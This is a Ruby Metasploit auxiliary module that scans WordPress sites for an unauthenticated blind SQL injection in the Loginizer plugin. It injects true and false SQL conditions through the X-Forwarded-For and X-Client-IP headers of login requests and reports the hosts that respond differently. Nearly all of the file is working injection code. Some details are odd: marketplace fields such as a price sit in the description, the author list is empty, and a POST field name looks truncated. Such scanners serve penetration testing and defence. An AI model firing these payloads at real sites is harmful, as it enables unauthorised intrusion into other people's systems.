##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Wordpress Loginizer SQL Injection Scanner',
      'Description' => %q{
This module scans for vulnerable instances of the Loginizer Wordpress plugin.

The Loginizer Wordpress plugin is a popular security-enhancing
plugin. Unfortunately, versions 1.3.5 and prior suffered from
an unauthenticated SQL injection. However, this vulnerability
was only exposed in non-default configurations of the
Loginizer plugin, such as load-balanced or reverse proxy
configurations.

Categories: Open Source, Wordpress

Price: 0

Video: none

OS: Multi

Arch: Multi

Requirements: Metasploit Framework
      },
      'Author'       => [],
      'License'     => 'VolatileMinds'
    )

    register_options(
      [
        OptString.new('PATH', [ true,  "The path to Wordpress", '/']),
      ], self.class)

  end

  def run_host(target_host)
    true_res = make_injected_request("' AND 3318=3318-- fdsa")
    false_res = make_injected_request("' AND 3318=3317-- fdsa")

    if true_res.body =~ /You have exceeded maximum login retries/ and false_res.body =~ /Incorrect Username or Password/
			print_good("#{peer} - Found vulnerable Loginizer plugin")

      report_service({
        host: target_host,
        port: datastore['RPORT'],
        name: 'Wordpress Loginizer',
        info: 'Wordpress Loginizer instance vulnerable to blind unauthenticated SQL injection'
      })
    end
  end

  def make_injected_request(sql)
    return send_request_cgi({
      'uri' => datastore['PATH'] + (datastore['PATH'][-1] == '/' ? '' : '/') + 'wp-login.php',
      'method' => 'POST',
      'vars_post' => {
        'log' => Rex::Text.rand_text_alpha(8),
        'pwd' => Rex::Text.rand_text_alpha(8),
        'wp-submi' => 'Log In',
        'redirect_to' => '/wp-admin/'
      },
      'headers' => {
        'X-Forwarded-For' => sql,
        'X-Client-IP' => sql
      }
    })
  end
end
